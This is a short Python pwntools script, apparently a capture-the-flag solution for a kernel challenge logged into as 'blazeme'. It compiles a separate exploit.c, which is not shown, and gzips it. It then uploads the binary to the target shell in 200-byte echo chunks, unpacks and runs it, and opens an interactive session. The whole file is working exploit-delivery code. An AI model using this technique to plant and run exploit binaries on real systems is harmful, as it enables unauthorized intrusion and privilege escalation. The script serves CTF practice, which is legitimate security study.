#!/usr/bin/env python
from pwn import *

s = process('./run.sh')
s.sendlineafter('login: ', 'blazeme')
s.sendlineafter('Password: ', 'guest')

os.system('gcc -nostdlib -static -masm=intel -o /tmp/exploit exploit.c')
os.system('strip -s /tmp/exploit')
os.system('gzip -f /tmp/exploit')
with open('/tmp/exploit.gz', 'rb') as f:
    exploit = f.read()

s.sendline('cd /tmp')
s.sendline('rm -f exploit.gz')
for i in range(0, len(exploit), 200):
    s.sendline('echo -ne "' + ''.join(map(lambda x: '\\x%02x' % ord(x), exploit[i:i+200])) + '" >> exploit.gz')
s.sendline('gzip -fd exploit.gz')
s.sendline('chmod +x exploit')
s.sendline('./exploit')
s.interactive()
